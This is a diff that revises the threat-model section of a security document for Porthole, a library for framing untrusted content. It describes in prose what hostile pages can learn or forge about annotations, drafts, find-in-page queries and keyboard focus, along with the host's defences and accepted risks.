-- *What content learns.* Everything the host sends in a `show` is posted into the frame's window,
-  where the content can listen: each mark's id, anchor and, where given, `count` (the number on
-  its marker). A host gives ids that say nothing (never a person's name or a comment's words), and
-  a count only where the page may know how many there are. Who commented and what they wrote stay
-  in the host's own UI, outside the frame, and so does what the person types there, unless a
-  page takes the keyboard meanwhile ("The keyboard" below).
-- *Drafts* (P107). A mark with `kind: "draft"` (a comment its author hasn't posted) is drawn apart,
-  a dashed line and a hollow marker with no number, so the page also learns which of its marks are
-  drafts: that the person viewing it is writing a comment there, before they post it. That is new
-  information for the page, accepted where the page has no way out: drafts are the host's to send
-  only to their author's own frame (Porthole can't tell whose frame it is), the page is the one
-  being commented on and already sees where the person selects (`selected`), and closed egress
-  ([§4](#4-two-lines-of-defense)) keeps it off the network. Closed egress doesn't cover the
-  channels the host itself opens, and through them a draft's existence, place and timing can
-  leave: a page with the runtime's `db` (writes) and `user` can call `user.get()`, read the marks
-  shown to it, and write "viewer A is drafting at section 3" where its author and other viewers
-  read it before A posts; once A posts, the page can tie that posted comment to A (the anchor and
-  the time match). Origins a config declares for egress (an MCP App's `connectDomains`, S5; an
-  `egress` a host opened in its own config; the `liveWidget` preset itself has none, P103), and a
-  host function that sends the page's words somewhere, are channels of the same kind (S4, and the
-  app runtime below). A host that sends drafts to such a page accepts that its author and other viewers can
-  learn of them. A draft carries nothing else: the host drops its count before the frame (control
-  `draft-count`), so a page can't read how many drafts are at an anchor unless the host sends a
-  mark per draft, and its id is the host's, as any mark's (random, never the draft's words); the
-  draft's words are typed into the host's composer, which the page can try to take the keyboard
-  from ("The keyboard" below). A host
-  that sends drafts into a frame others see (a shared screen, a frame several viewers share) tells
-  that page, and anything it draws for them, what its author hasn't posted.
+- *What content learns.* Everything in a `show`: each mark's id, anchor and, where given, `count`.
+  A host gives ids that say nothing (never a person's name or a comment's words), and a count only
+  where the page may know how many there are. Who commented and what they wrote stay in the host's
+  UI, outside the frame, as does what the person types there unless the page takes the keyboard.
+- *Drafts* (P107). A mark with `kind: "draft"` is drawn apart, so the page learns that its viewer
+  is writing a comment there, before they post it. Accepted where the page has no way out: the
+  host sends drafts only to their author's own frame (Porthole can't tell whose frame it is), the
+  page already sees where the person selects, and closed egress keeps it off the network. Channels
+  the host opens can carry a draft's existence, place and timing: with `db` writes and `user` a
+  page can write "viewer A is drafting at section 3" for its author and other viewers to read
+  before A posts, then tie the posted comment to A. Declared egress (an MCP App's
+  `connectDomains`, an `egress` the host opened; `liveWidget` has none, P103) and a host function
+  that sends the page's words somewhere are the same. A host that sends drafts to such a page
+  accepts that. A draft carries nothing else: its count is dropped before the frame (the page
+  can't count the drafts at an anchor unless sent a mark per draft), and its id is the host's
+  (random). A host that sends drafts into a frame others see (a shared screen) tells
+  that page, and what it draws for them, what its author hasn't posted.
 - *What content can fake.* Any report: a selection while the host asks for one, where marks are,
-  and a marker's click (`activated`) for any mark the host shows with a marker (a count, or a draft:
-  P107), without a click on it and with any box. It can draw look-alike markers, or lay its own elements over Porthole's.
-  The host takes each report only for what it asked for and its own shown ids, rebuilt within
-  `ANNOTATION_LIMITS`, at 120 a minute; `activated` for a mark without a marker, or an id it
-  doesn't show, is dropped (negative control `annotation-activated`). No proof of a gesture is
-  asked of it (0.16.0, P149; from 0.10 to 0.15, P105 took one only while the host's page had
-  transient user activation, which lasts 5 s after any gesture anywhere on the page, so a fake
-  posted on a timer or a scroll passed anyway): a page can open the host's view for one of its
-  shown marks at any moment, and one posted on the person's own press in the content lands under
-  their pointer. The guard on the host's view (§6) is the defence.
-- *Labels.* An anchor's `label` is the page's text: the words selected, or an element's own words,
-  else its `alt`, `aria-label` or `title`, which the person never sees on the page. The host takes
-  out of every label everything a person can't see (every format character, bidi controls and
-  zero-width ones among them, every default-ignorable code point, variation selector, tag,
-  private-use character and control: P105, with none of P100's exceptions for emoji and shaped
-  letters, whose surroundings a page can fake), so what it shows is what it has. A text
-  anchor's quote (`exact`) keeps them, to be found again: a host that hands a quote or a label to
-  a model hands it the page's words, to be read as that, never as instructions.
-- *Boxes.* Every box a report carries (`selected`, `activated`, `anchored`) is the page's word.
-  Porthole clamps each to the frame's viewport as it is when the report arrives, before the host
-  hears it: the part inside is kept, and a box wholly outside becomes one of no size on the
-  nearest edge (control `annotation-rect-clamp`). So a page can't make the host place its own UI
-  over the rest of the app. It still chooses any point inside its own frame: a box is a
-  positioning hint, never a fact about the content. The box is in the frame's own CSS px, its
-  layout size: a host that scales or transforms the frame (a thumbnail, a zoomed preview) maps the
-  box through that transform before placing anything by it. A platform's `viewport()` that answers
-  no size, or throws, clamps every box to nothing at the frame's corner (P105). The frame's size is
-  read for every report the host takes, before the report's rate: a forced layout of the host's
-  page per message, which a repeated `ui/initialize` already causes (accepted, P105).
-  A newer shell also says where each mark is in the document (`documentRect` in `anchored` and
-  `tracked`, with the document's `scroll`, P132), so a host can place a mark scrolled out of the
-  frame. Porthole checks those numbers (finite, within `ANNOTATION_LIMITS.coordinate`, sizes not
-  negative; a malformed one drops the report) but doesn't clamp them, since a clamp would erase
-  what they are for: a host that maps a `documentRect` onto its own page without clipping to the
-  frame's box (or to its own region beside it) lets the page choose where that UI goes, outside
-  the frame as well (accepted, P132; the host's duty in §6). They say nothing else: the page knows
-  where its words are anyway. Where a selection or a mark's words end (`lastLineDocumentRect` in
-  `selected`, `anchored` and `tracked`, P133) is one more such box, read, checked and left unclamped
-  the same way, with the same duty; `selected` also carries `scroll` now. A report with a last line
-  and no `scroll` is dropped (P137), as a malformed part drops one. A followed selection's reports
-  (`selectionTracked`, P138) are the same boxes, checked and clamped the same way, taken only while
-  the host follows the selection and within `tracked`'s 60 a second (control
-  `track-selection-checks`); their `inView` is false unless the box reaches the frame's viewport as
-  the host reads it. They carry nothing of the page's words; a host that follows no selection
-  drops them unread, so a malformed one is no refusal either (P140). The page reads the host's word
-  that starts and ends the following, so it learns when a composer is open on its selection, as it
-  learns which card is open from `track` (P112): end it on every close, kept or dismissed. The
-  outline the frame draws over what was picked, or over the followed selection, is in the shell's
-  layer, a closed shadow root that takes no pointer: the page can't read it, and its clicks reach
-  the page as before. What the frame keeps for a follow (a reference to the element picked, or a
-  copy of the selected range) is not in that layer: it is held in the shell's own script, in
-  memory, in a variable no page script can name. It is the page's own DOM all the same (the
-  element is the page's, and the range's copy moves with the page's nodes), so it tells the page
-  nothing it can't read itself, and the page can change or remove what it points at, which is
-  `orphaned`. In 0.14.15 every host's frame kept both after a pick, the outline until the next
-  pick or selection, `clearSelection`, `start`, `stop`, `clear`, Escape or the element leaving the
-  page, and the kept selection until the next `selected`; since P140 only a host that follows the
-  selection (`track({ selection: true })`) or said at `start` that it will (`keepSelection`) gets
-  them, and any other host's frame draws and keeps nothing after a pick, as in 0.14.14. The page
-  reads `keepSelection` in every `start`, so it learns at each one that the host will follow the
-  selection: before any pick, and earlier than the first `track` would tell it. That is a property
-  of the host's UI, not of anything the person did or wrote.
-- *What holds, against content that patches none of the DOM's or JavaScript's built-ins.* A real
-  press or click on a marker reaches none of the content's handlers (the shell's first listener
-  stops it; control `marker-click`) and moves neither focus nor a selection (control
-  `marker-prevent`), so content can't act on it or cancel it; nor can it read or reach inside the
-  shell's layer (a closed shadow root). Content can still tell that a marker was pressed, and
-  roughly where: the pointer leaving its own element names the layer, the layer matches `:hover`
-  and `:active`, and the frame gets user activation. On touch (P119), a marker is also the
-  44 by 44 px box around its bubble, drawn in that same layer: a tap there is a press on the
-  marker, with the same checks (a trusted click, the main button, on the layer), so the content
-  loses a tap within 13 px of a bubble (a few px of its words above and below it), as it loses
-  one on the bubble. Which pointer is used is read from trusted pointer events only; a page that
-  makes its own up changes nothing, and a real `activated` still needs a real click.
-- *The keyboard on a marker* (P133, reversing P104's point 6). A marker is a button with a tab
-  stop. Enter and Space on it are stopped in the shell's first listener, as a press is (control
-  `marker-key`), and the click they make is a trusted one the content doesn't get (`marker-click`):
-  it can neither hear nor cancel them. Every other key on a marker is the page's, as on a button of
-  its own, Tab too. So what P104 feared stands, and is accepted: the markers join a focus order the
-  content controls. It can take the focus from a marker (`focus()` from any handler or timer), keep
-  the person from reaching one (a trap on Tab in its own elements), draw its own look-alike with
-  its own tab stop, and tell that the person is on one (`document.activeElement` is the layer, its
-  own element's `focusout` names it). None of that gives it what it lacks: a marker's press has no
-  power but `activated`, which it can fake anyway within the host's checks, keys go to a marker only
-  while the frame has the focus, so nothing typed in the host passes through it,
-  and a page's made-up key or `click()` is no trusted click. Assistive technology now reads the
-  marker's name, the page's own words after the shell's, in quotes that bound nothing (P134: a
-  text anchor's `label`, an element's quote, or what follows the tag in its `label`). A host can't
-  rely on a marker being reached, as it can't on one being seen: its own list of marks is the
-  keyboard way that holds.
-- *Which input made an `activated`* (P134). The report doesn't say, and a field saying so would be
-  the page's word. A host reads its own page instead, as the report arrives: is the frame element
-  `document.activeElement`? The page can't fake that reading, and that is all it gets. It tells that
-  the focus is in the frame, not that a key was pressed: a pointer's click after the person was
-  in the frame reads the same, and the page can move the focus into its frame itself, from
-  anywhere (nothing takes such a move back, P149). **The page can still forge
-  `activated` while the person really is in the frame, and this signal doesn't stop that.** A host
-  that moves the keyboard into its view on the signal takes §6's second exception, with its
-  conditions: a page can put the person's next keys in that view, and keeping those keys from posting
-  is the host's own gate on that view's controls and on its shortcuts, not Porthole's.
-- *Back to a marker* (P134). `annotations.focusMark(id)` is the host's word to the frame
-  (`porthole/annotate.focusMark`, `{ id }`), for one moment only: after the keyboard closed the host's
-  own view of that mark, by Escape or by a Tab past its first or last control. No content goes with it, beyond an id the frame has, and nothing comes back. The
-  shell moves the focus through the platform's `focus` as it was before content ran (control
-  `marker-focus`: a page that replaced it is handed the marker otherwise); with no such marker it does
-  nothing. The page reads the message, so it learns a card closed, and can take the focus back at once
-  or forge the message and focus a marker itself, which gives it nothing a fake `activated` doesn't:
-  a host can't rely on the focus landing.
-  A word that has to wait while the frame finds its marks is up to a second old when it could land
-  (P135). A word the shell doesn't park can be as old: the frame takes it when its thread is free, a
-  busy page changes nothing the shell can see, and a frame out of process doesn't stop the host's
-  page meanwhile (P137). A marker's `focus()` takes the keyboard with no gesture on Chromium and
-  WebKit: a person gone on to a host's button would be pulled back. So the shell drops a parked word unless the focus is in its document as it lands, and
-  a word older than 100 ms unless the focus is there as it comes, by `hasFocus` as it was before
-  content ran (control `marker-has-focus`: a page that replaced it to say yes gets the landing
-  otherwise; `marker-late` takes the first test out, `marker-busy` the second). A word's age is the
-  shell's `Date.now` as it was before content ran, less the stamp `createHost` put on it as it was
-  sent (`at`): one machine's wall clock (control `marker-clock`: a page that stopped its own clock
-  makes a late word look fresh otherwise). A word with no stamp, from an older host, is old. A fresh
-  word isn't asked: the frame has no focus then on the very path it is for. That leaves a person who
-  moves on within those 100 ms, faster than a person does, and a page that forges the whole word with
-  a fresh stamp, or rewrites a real word as it arrives, as it can forge the word at all, which gives it nothing (P134). A page
-  can really take the focus and so pass the test, which gives it nothing, since it then has the
-  keyboard; and a word that passes it can still move the focus off the page's own field onto a marker,
-  inside the frame. §6 has the host's side: a second `focusMark` after its own `display.focus()`.
-  The word is a message, so from the host's close until the frame moves, the focus rests on the host's
-  body. A forged `activated` in that gap finds no frame focused, so a host that gates a view on "the
-  frame had the focus" doesn't gate that one. That is accepted, on the host's side of the wall: such
-  a view takes no focus and keeps keys out until the focus has reached the frame (in Raft, content
-  inert for 500 ms, and the focus handed back to the frame within 150 ms if the marker didn't take
-  it, with `focusMark` again after it, P135), so the keys go to the page and nothing is written.
-- *What doesn't hold against content that does.* The shell shares the content's realm. It reads
-  and stops a marker's press through the platform's own functions and getters, kept before
-  content runs (P105, control `marker-originals`), so patching `Event`'s or `MouseEvent`'s
-  prototypes no longer lets content hear a press or make the shell misread one. But the layer's
-  nodes pass through built-ins content can replace (the shell's insertion guards call
-  `Element.prototype.matches` on them), so content can reach the closed shadow root that way,
-  read the markers and rewrite them (the review of P104, on all three engines). Nothing in the
-  layer is secret: it holds only what `show` sent, which the content can read anyway.
-- *Clearing the selection* (P115). `annotations.clearSelection()` is the host's word to the frame
-  (`porthole/annotate.clearSelection`), with nothing back: the shell takes the page's selection
-  away through `Selection.prototype.removeAllRanges` as it was before content ran (control
-  `clear-selection`: a page that replaced it keeps its selection otherwise) and forgets the one it
-  told, so the clear makes no `unselected` or `selected`. It goes host to frame only: the host
-  takes no such message from a frame, and the shell takes it only from its frame's parent (a page
-  that posts it to its own window is dropped). It gives the page no power it lacks: a page can
-  clear or select its own text at any time, and can select the words again right after a clear
-  (the host hears that as any selection, while it asked for text). But the page sees the clear
-  (the message, and a `selectionchange` with no press of its own) and so learns when the person
-  was done with its selection (P121, after the audit of P115). A host that clears only when a
-  draft is added tells the page that a draft exists on its words, and when: clear when the
-  composer opens, or on every close, kept or dismissed, or leave it to the person's next click,
-  never only on a draft, above all for a page `mayPassOn` says to keep drafts from (ADOPTING.md
-  § Annotations).
-- *What content can always do.* Hide, shrink, move or cover the layer (its scripts can rewrite the
-  layer's style, lay elements over it, or transform the page it sits in), change its words so a
-  mark is orphaned, or flood the shared rate so real reports are refused. It can also make the
-  shell's own work dear by its layout: finding marks again and placing markers after a change of
-  the content runs in the frame, once per quiet run of changes, and each marker in view is placed
-  by a bounded number of hit tests (measured with 300 marks with counts in view: about 20 ms a
-  change; 200 in a 3,000-line block: 25 to 50 ms; P105). In an opaque frame that shares the host's
-  process, that time is the host's too ([§5](#5-out-of-scope)). An honest page's
-  follow-up reports, of the marks (while one has a marker) and of the person's selection after a
-  scroll, share one clock: at most one a second together, each only when its box moved (P105).
+  and `activated` for any mark shown with a marker (a count, or a draft), without a click and with
+  any box; and look-alike markers, or its own elements over Porthole's. The host takes a report
+  only for what it asked and its own shown ids, rebuilt within `ANNOTATION_LIMITS`, at 120 a
+  minute; `activated` for a mark without a marker, or an id it doesn't show, is dropped. No
+  gesture is asked (P149: the host page's activation lasts 5 s after any gesture on it, so a fake
+  on a timer would pass anyway), so a page can open the host's view for a shown mark at any
+  moment, under the person's pointer. The guard on that view (§6) is the defence.
+- *Labels.* An anchor's `label` is the page's text, possibly words the person never sees (`alt`,
+  `aria-label`, `title`). The host takes out of every label all a person can't see (format, bidi
+  and zero-width characters, default-ignorable code points, variation selectors, tags, private-use
+  characters and controls: P105, without P100's exceptions for emoji and shaped letters). A text
+  anchor's quote (`exact`) keeps them, to be found again. A host that hands a quote or a label to a
+  model hands it the page's words, never instructions.
+- *Boxes.* Every box a report carries (`selected`, `activated`, `anchored`) is the page's word,
+  clamped to the frame's viewport before the host hears it (the part inside is kept, a box wholly
+  outside becomes one of no size on the nearest edge; a platform `viewport()` that answers no size,
+  or throws, clamps every box to the frame's corner). So the page can't place the host's UI over
+  the rest of the app, but chooses any point in its frame: a box is a positioning hint, never a
+  fact. Boxes are in the frame's CSS px: a host that scales or transforms the frame maps them
+  through that transform. Reading the frame's size for each report, before the rate, forces a
+  layout of the host's page per message, as a repeated `ui/initialize` already does (accepted,
+  P105).
+- *Places in the document* (P132, P133, P137). `documentRect` and `lastLineDocumentRect`, with the
+  report's `scroll`, are checked (finite, within `ANNOTATION_LIMITS.coordinate`, sizes not
+  negative; a malformed one, or a last line without `scroll`, drops the report) but not clamped,
+  since a clamp would erase what they are for. Unclipped, they let the page choose where the host's
+  UI goes, outside the frame too (accepted; the host's duty in §6). They say nothing else: the page
+  knows where its words are anyway.
+- *A followed selection* (P138, P140). `selectionTracked` boxes are checked and clamped the same
+  way, taken only while the host follows the selection (otherwise dropped unread, without a
+  refusal), within `tracked`'s 60 a second, and carry none of the page's words; `inView` is false
+  unless the box reaches the frame's viewport as the host reads it. The page reads the host's word
+  that starts and ends the following, and `keepSelection` in every `start`, so it learns when a
+  composer is open on its selection (as `track` tells it which card is open, P112), and before any
+  pick that the host will follow one: end the following on every close, kept or dismissed. What the
+  frame draws for a follow is in the shell's closed layer, which takes no pointer; what it keeps
+  (the element picked, a copy of the range) is the page's own DOM, so it tells the page nothing
+  new, and the page can remove it (`orphaned`). For a host that neither follows nor said
+  `keepSelection`, the frame draws and keeps nothing after a pick.
+- *A press on a marker*, against content that patches none of the built-ins, reaches none of the
+  content's handlers and moves neither focus nor a selection, so content can't act on it or cancel
+  it; it can't read or reach inside the layer, but can tell a marker was pressed, and roughly where
+  (`:hover`, `:active`, the pointer leaving its element, the frame's activation). On touch (P119) a
+  marker takes a 44 by 44 px box around its bubble, so content loses a tap within 13 px of one.
+  Which pointer is used is read from trusted events only, and a real `activated` needs a trusted
+  click. Content that does patch built-ins still can't hear a press or make the shell misread one
+  (P105), but can reach the closed layer through `Element.prototype.matches`, and read and rewrite
+  the markers. Nothing in the layer is secret: it holds only what `show` sent.
+- *The keyboard on a marker* (P133). A marker is a button with a tab stop. Enter and Space on it
+  are stopped before the content and make a trusted click it doesn't get; every other key, Tab too,
+  is the page's. So the markers join a focus order the content controls (accepted, reversing P104's
+  point 6): it can take the focus from a marker, keep the person from reaching one, draw a
+  look-alike, and tell that the person is on one. That gives it nothing it lacks: a marker's press
+  has no power but `activated`, which it can fake anyway; keys reach a marker only while the frame
+  has the focus, so nothing typed in the host passes through it; and its own key events or
+  `click()` make no trusted click. Assistive technology reads the page's words in a marker's name,
+  in quotes that bound nothing (P134). A host can't rely on a marker being reached: its own list of
+  marks is the keyboard way that holds.
+- *Which input made an `activated`* (P134). The report doesn't say. A host can read its own
+  `document.activeElement`, which the page can't fake: it says the focus is in the frame, not that
+  a key was pressed, and the page can move the focus there itself. **The page can still forge
+  `activated` while the person really is in the frame.** A host that moves the keyboard into its
+  view on this signal takes §6's second exception: keeping the next keys from posting is its gate.
+- *Back to a marker* (P134, P135, P137). The page reads `focusMark` (an id it has; nothing comes
+  back), so it learns a card closed, and can take the focus back or forge the word, which gives it
+  nothing a fake `activated` doesn't; a host can't rely on the focus landing. The shell drops a
+  late word unless the focus is in the frame (§6), through built-ins kept before content ran, so a
+  word can't pull back a person gone on to a host's button. Accepted: a person who moves on within
+  100 ms; a page that forges a fresh word or takes the focus itself (then it has the keyboard
+  anyway); a word moving the focus from the page's own field onto a marker. Between the host's
+  close and the frame's move the focus is on the host's body, so a forged `activated` then finds no
+  frame focused: a view gated on "the frame had the focus" isn't gated by it, and must take no
+  focus and keep keys out until the focus reaches the frame, so the keys go to the page and nothing
+  is written.
+- *Clearing the selection* (P115, P121). `clearSelection` goes host to frame only, and nothing
+  comes back. It gives the page no power it lacks (it can clear or select its own text at any time,
+  and select the words again right after a clear), but the page sees it, so it learns when the
+  person was done with its selection. Clear when the composer opens, or on every close, or leave it
+  to the person's next click; never only when a draft is added, which tells the page a draft exists
+  there, and when (above all for a page `mayPassOn` says to keep drafts from).
+- *What content can always do.* Hide, shrink, move or cover the layer, change its words so a mark
+  is orphaned, or flood the shared rate so real reports are refused. It can make the shell's work
+  dear by its layout: marks are found again and markers placed after each quiet run of changes, a
+  bounded number of hit tests per marker in view (300 marks with counts in view: about 20 ms a
+  change; 200 in a 3,000-line block: 25 to 50 ms; P105), which in an opaque frame in the host's
+  process is the host's time too ([§5](#5-out-of-scope)). An honest page's follow-up reports share
+  one clock: at most one a second, each only when its box moved.
 - So `activated` opens the host's own view of a mark it already shows, placed within the frame's
   box (better: beside it), guarded as §6 says, and never acts on it (no post, submit, discard,
   resolve, delete or reply); an anchor or a rect decides where something is drawn, never who may
   see or do anything.
 
-**Find in page** (`find`, P131). The host draws its own find bar; the shell finds the query in the
-content's text (annotations' text index) and highlights the matches in a layer of its own (a closed
-shadow root, as annotations' marks; never the CSS Custom Highlight API, which is the content's to
-read and rewrite). It shares its realm with the content, so:
+**Find in page** (`find`, P131). The host draws its own find bar; the shell finds and highlights
+matches in a closed layer of its own, in the content's realm (how: [DESIGN.md](DESIGN.md) § Find
+in page).
 
-- *What content learns.* The query (`porthole/find.query`, posted into the frame's window), each
-  time the host sends it (a bar that searches as the person types sends their typing, key by key),
-  whether it is case-sensitive, each move to the next or previous match, when the bar clears, and
-  whether the host draws its own bar (`porthole/find.handled`). The query is the person's words,
-  typed in the host's own UI: a page with a way out (an MCP App's `connectDomains`, S5; egress a
-  host opened; a carrier such as `db`, `mayPassOn`) can send what the person searched for to its
-  author. That is why `find` is a capability a config declares, in no preset by default; accepted
-  by the product owner, with hosts sending queries on a pause or Enter rather than at every key
-  (P131). A query holds only for the content it was asked of: a new run or other content forgets
-  it, so another page is never searched with it (it would learn the words from what matched).
-- *What content can say.* Any count and current match (bounded: at most 1,000, whole numbers, the
-  current one among them), any box inside its frame (clamped to the frame's viewport, as
-  annotations' boxes, P104), and an `updated` while a query is shown. The host takes an answer only
-  for a query it asked, under that query's id; anything malformed is `"unsupported"` or a refusal.
-  A find bar's numbers, never a fact about the content.
-- *The shortcut.* While the host draws its own bar (`find.takeShortcut(true)`), the shell cancels
-  the browser's find on Cmd+F (Apple) or Ctrl+F (elsewhere) in the frame and says `requested`; a
-  page that handles the key itself keeps it. The page can say `requested` without the key, or keep
-  the key from the shell. The host takes it only while the platform says the page's focus is in
-  the frame (control `find-requested-focus`): a page that hasn't the keyboard can't open the
-  host's bar, which takes focus, while the person types in the host's composer, so their next
-  keys aren't steered into the bar and from there into the frame as queries. That holds where a
-  page can't take the keyboard by itself (Firefox, without the person's gesture); on Chromium and
-  WebKit a page takes it first ("The keyboard" below), and then has the keys anyway. A real
-  press of the shortcut is always in the frame, so the rule refuses none. Where a platform can't
-  tell, it passes. Open the bar, nothing more.
+- *What content learns.* Each query the host sends (a bar that searches as the person types sends
+  their typing, key by key), whether it is case-sensitive, each move between matches, when the bar
+  clears, and whether the host draws its own bar. The query is the person's words: a page with a
+  way out (`connectDomains`, S5; egress a host opened; a carrier such as `db`, `mayPassOn`) can
+  send them to its author. So `find` is declared, in no preset by default, and hosts send queries
+  on a pause or Enter rather than at every key (accepted by the product owner). A query is
+  forgotten on a new run or other content, so another page never learns it from what matched.
+- *What content can say.* Any count and current match (at most 1,000, whole numbers, the current
+  one among them), any box in its frame (clamped as annotations' are), and an `updated` while a
+  query is shown. The host takes an answer only for a query it asked, under its id; anything
+  malformed is `"unsupported"` or a refusal. These are a find bar's numbers, never facts.
+- *The shortcut.* While the host takes it (`find.takeShortcut(true)`), the shell cancels the
+  browser's find on Cmd+F or Ctrl+F and says `requested`; a page that handles the key keeps it, and
+  a page can say `requested` without it. The host takes `requested` only while the platform says
+  the page's focus is in the frame, so a page without the keyboard can't open the host's bar
+  (which takes focus) while the person types in the host's composer and steer their next keys into
+  queries. That holds where a page can't take the keyboard by itself (Firefox, without a gesture);
+  on Chromium and WebKit a page can take it first, and then has the keys anyway. A real press is
+  always in the frame, so the rule refuses none; where a platform can't tell, it passes.
 - *What content can always do.* Hide, cover or move the layer, change its words so the count
-  changes, reach the layer through built-ins it patched (as annotations' layer, P105), or make the
-  search dear: linear in its text, at most 1,000 matches kept and 10,000 looked at, a query of 256
-  characters, found again at most once a second while the content changes, and of a burst of
-  queries only the latest searched (the others answered superseded); in an opaque frame that
-  shares the host's process that time is the host's too ([§5](#5-out-of-scope)).
+  changes, reach the layer through patched built-ins, or make the search dear (linear in its text;
+  at most 1,000 matches kept and 10,000 looked at; queries of 256 characters; found again at most
+  once a second while the content changes; of a burst, only the latest searched), which in an
+  opaque frame in the host's process is the host's time too ([§5](#5-out-of-scope)).
 
-**The keyboard** (P109, P149). Any display, of any kind and any version, can move the keyboard
-into its frame: `element.focus()` runs in the content's realm, where nothing of Porthole can stop
-it, and on Chromium and WebKit it needs no gesture. What the person goes on typing then goes to the
-page, which can keep it (`db`) or send it out through any egress it has, until the person sees
-their words stop appearing and clicks back. The page knows when it matters: its shell reports
-`selected` when the host opens a composer on it, and draft marks (P107) say where the person is
-writing. P107 and P108 didn't make this possible; they put the person's unposted words beside the
-frame and tell the page when.
-
-- *Nothing takes it back* (0.16.0, P149). From 0.13 to 0.15 `createHost` guarded every display
-  (P109): a move of the keyboard from one of the host's text fields into a frame was undone unless
-  the guard judged it the person's own. It had to guess. The host's page sees no press inside a
-  cross-site frame on full Chromium (the frame is out of process) nor on Firefox, so the guard
-  read what it could (`:active`, the pointer's place, the time since the person's last key, and
-  for a nested page its shell's word on its activation, then on its presses: P111, P120, P122,
-  P148), and each rule refused some real clicks while a page could still pass for the person
-  where the signals ran out (a key typed slower than 250 ms apart, P123). A wall that guesses is
-  no wall, and its wrong guesses were the person's own clicks refused; it is gone, with the
-  nested pages built to feed it.
-- *What holds without it.* Content can't read the host's page or its fields, can't move focus
-  into a field of the host's, and gets no key typed while the focus is in the host's page. A page
-  that takes the keyboard gets the keys typed after its move and before the person notices: what
-  they meant for the host's composer, not what is already in it.
-- *What a host does.* Shows no untrusted display beside a field that must never lose a key (a
-  password, a payment field); opens the views a display's report asks for without focus (§6);
-  and moves focus itself with `display.focus()` and `focusField(field)`, which land on every
-  engine (Firefox ignores a field's plain `focus()` while a frame that takes focus back on its
-  blur holds it).
+**The keyboard** (P109, P149; the accepted risk in §5, the host's side in §6). `element.focus()`
+runs in the content's realm, where nothing of Porthole can stop it, and on Chromium and WebKit it
+needs no gesture. The keys the person goes on typing the page can keep (`db`) or send out through
+any egress it has, and it knows when they matter: `selected` says a composer opened on it, and
+draft marks say where the person is writing. Nothing takes the keyboard back: the host's page sees
+no press inside a cross-site frame on full Chromium or Firefox, so a guard could only guess, and
+its guesses refused the person's own clicks while a page could still pass for the person (P123).
+What holds: content gets no key typed while the focus is in the host's page, and so only the keys
+typed after its move and before the person notices, never what is already in the host's composer.
 
 ### The app runtime
 
 What it is: `config.runtime: "1"`, for inline widgets and artifact pages. A page reaches the
 host's services through `porthole.use(name)`. Without it there is no `porthole` global, and the
 config can't name the runtime's own host functions. A host that only shows content can skip this
-section.
+section. How it works: [DESIGN.md](DESIGN.md) § The capability runtime; how to wire it, with code:
+[ADOPTING.md](ADOPTING.md) § The capability runtime.
 
 **Porthole guarantees**, in the bridge, before any handler runs:
 
 - A page reaches the built-ins its kind offers (`clipboard`, `links`, `downloads`, `comments`) and
   what it declared when published; anything else is refused (`undeclared`). The names it declares
-  in `data` hold with a viewer and without one (P094). A page from before 0.7 (the
-  host's `null` declaration) keeps 0.6's surface and gets none of `user`, `artifact`, `assets` and
-  `db`.
+  in `data` hold with a viewer and without one (P094). A page stored before runtime declarations
+  (the host's `null` declaration) takes the legacy path: the built-ins and the old globals, none of
+  `user`, `artifact`, `assets` and `db`.
 - Each method has a least level (`view < interact < admin < owner`), held against the viewer's
   level from the host's `access`. A display without a viewer gets nothing above `view` and none of
   the runtime's own host functions.
@@ -1038,9 +901,9 @@ section.
   declarations allow (P093).
 - `db`: another person's `data/users/<id>` is refused at every level; `me` is the host's id for
   the viewer, and paths in answers say `data/users/me`, never that id.
-- What changes the artifact for everyone needs, by default, a confirmation with its whole effect:
-  `artifact.publish` and `assets.delete` (a host's `methodGates` for them replace this; no proof
-  of a click is asked since 0.16.0, P149).
+- `artifact.publish` and `assets.delete` change the artifact for everyone, so by default they need
+  a confirmation with their whole effect (a host's `methodGates` for them replace this; no proof
+  of a click is asked, P149).
 - A `db.batch` runs under the gates of each of its writes, and a `db.watch` under those of `get`
   or `query`, as well as their own; a batch that needs a confirmation is confirmed once, whole
   (P094).
@@ -1050,20 +913,17 @@ section.
   only while the config still lets uploaded code run, asked at every load, in bearer mode too
   (where every artifact config must; P103); anything else is a download.
 - `comments` is write-only: the page learns only whether the composer opened. It reaches the
-  host's handler whenever the page calls it, at most 30 times a minute; no proof of a click is
-  asked (0.16.0, P149; from 0.13 to 0.15 it needed a gesture with the host page's focus in the
-  calling frame, P109, which refused real clicks wherever the guess at that focus was wrong).
-  Whether the composer opens is the host's handler's answer. A
-  draft it gives (P108) is at most 2,000 characters of text a person can
-  see (P109): nothing invisible (zero-width characters, bidi and tag characters, controls but a
-  new line and a tab; U+200C and U+200D only between two letters or marks, where Persian and the
-  Indic scripts need them, never first, last, doubled, beside a space or punctuation, or in an
-  emoji sequence; a variation selector after a pictograph is fine), no line or paragraph
-  separator, not blank-looking, at most 32 blanks in a row and two blank lines in a row; anything
-  else is refused before the handler. A joiner between two letters that shapes nothing still
-  draws as nothing (about a bit per letter boundary, measured): accepted, as P100 accepts it. The anchor's
-  label and quote reach the handler without what a person can't see, and are refused if nothing
-  visible is left.
+  host's handler whenever the page calls it, at most 30 times a minute, with no proof of a click
+  (P149); whether the composer opens is the handler's answer. A draft it gives (P108) is at most
+  2,000 characters of text a person can see (P109), or it is refused before the handler: nothing
+  invisible (zero-width, bidi and tag characters, controls but a new line and a tab; U+200C and
+  U+200D only between two letters or marks, where Persian and the Indic scripts need them, never
+  first, last, doubled, beside a space or punctuation, or in an emoji sequence; a variation
+  selector after a pictograph is fine), no line or paragraph separator, not blank-looking, at most
+  32 blanks in a row and two blank lines in a row. A joiner between two letters that shapes nothing
+  still draws as nothing (about a bit per letter boundary, measured): accepted, as P100 accepts it.
+  The anchor's label and quote reach the handler without what a person can't see, and are refused
+  if nothing visible is left.
 - `defineRuntimeConformance` checks the host's handlers, and with `api` its own API for `db`,
   `artifact` and `assets`, with a forged context (a viewer claiming to be the owner, no rules).
 
@@ -1081,27 +941,22 @@ section.
 - Handle abuse on shared pages (S4).
 - Show a comment's draft (P108) whole, as the person's editable plain text in its own composer,
   and post it only on the person's own Send, never on the page's word. Once posted, the comment is
-  the person's: mentions in it act as theirs, which is why they must see it all first. So (P109;
-  ADOPTING.md has the code):
+  the person's (mentions in it act as theirs), so they must see it all first (P109):
   - An open never replaces, appends to or moves what the person has typed, or the place they
     chose: while the composer holds their words, answer `false`, or show the page's words as a
-    separate suggestion that takes no focus. (The page knows they are writing anyway: its
-    `selected`, and draft marks.)
-  - A composer the page filled takes no focus when it opens (keys stay where the person was
